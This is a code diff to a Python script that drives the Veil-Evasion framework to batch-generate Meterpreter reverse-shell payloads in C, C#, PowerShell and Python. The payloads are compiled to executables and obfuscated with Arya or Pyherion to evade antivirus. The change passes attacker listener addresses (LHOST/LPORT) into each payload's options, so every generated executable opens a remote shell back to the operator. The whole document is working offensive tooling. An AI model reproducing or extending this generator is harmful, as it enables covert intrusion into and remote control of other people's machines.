@@ -19,21 +19,21 @@ parser.add_argument('-o',metavar='path/to/payloads',type=dir,help='Directory to 
 args = parser.parse_args()
 
 payload_list={
-              ("c/meterpreter/rev_http","compile_to_exe=Y use_arya=Y"),
-              ("c/meterpreter/rev_http_service","compile_to_exe=Y use_arya=Y"),
-              ("c/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
-              ("c/meterpreter/rev_tcp_service","compile_to_exe=Y use_arya=Y"),
-              ("cs/meterpreter/rev_http","compile_to_exe=Y use_arya=Y"),
-              ("cs/meterpreter/rev_https","compile_to_exe=Y use_arya=Y"),
-              ("cs/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
+              ("c/meterpreter/rev_http","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
+              ("c/meterpreter/rev_http_service","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
+              ("c/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
+              ("c/meterpreter/rev_tcp_service","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
+              ("cs/meterpreter/rev_http","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
+              ("cs/meterpreter/rev_https","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
+              ("cs/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
               ("cs/shellcode_inject/base64_substitution","compile_to_exe=Y use_arya=Y --msfpayload=windows/meterpreter/reverse_tcp"),
               ("cs/shellcode_inject/virtual","compile_to_exe=Y use_arya=Y --msfpayload=windows/meterpreter/reverse_tcp"),
-              ("powershell/meterpreter/rev_http","compile_to_exe=Y use_arya=Y"),
-              ("powershell/meterpreter/rev_https","compile_to_exe=Y use_arya=Y"),
-              ("powershell/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
-              ("python/meterpreter/rev_http","compile_to_exe=Y use_pyherion=Y"),
-              ("python/meterpreter/rev_https","compile_to_exe=Y use_pyherion=Y"),
-              ("python/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y use_pyherion=Y"),
+              ("powershell/meterpreter/rev_http","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
+              ("powershell/meterpreter/rev_https","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
+              ("powershell/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
+              ("python/meterpreter/rev_http","compile_to_exe=Y use_pyherion=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
+              ("python/meterpreter/rev_https","compile_to_exe=Y use_pyherion=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
+              ("python/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y use_pyherion=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
               ("python/shellcode_inject/aes_encrypt","compile_to_exe=Y use_pyherion=Y --msfpayload=windows/meterpreter/reverse_tcp"),
               ("python/shellcode_inject/arc_encrypt","compile_to_exe=Y use_pyherion=Y --msfpayload=windows/meterpreter/reverse_tcp"),
               ("python/shellcode_inject/base64_substitution","compile_to_exe=Y use_pyherion=Y --msfpayload=windows/meterpreter/reverse_tcp"),
@@ -49,7 +49,7 @@ payload_list={
 def CreatePayloadCommand(payload_tuple,LHOST,LPORT):
     file_name=payload_tuple[0].split("/")
     file_name=file_name[len(file_name)-3]+"_"+file_name[len(file_name)-2]+"_"+file_name[len(file_name)-1]
-    return "python "+veil_path+" -p "+payload_tuple[0]+" -c "+payload_tuple[1]+" LHOST="+LHOST+" LPORT="+LPORT+" --overwrite -o "+file_name
+    return "python "+veil_path+" -p "+payload_tuple[0]+" -c "+payload_tuple[1]+" --overwrite -o "+file_name
     
 
 
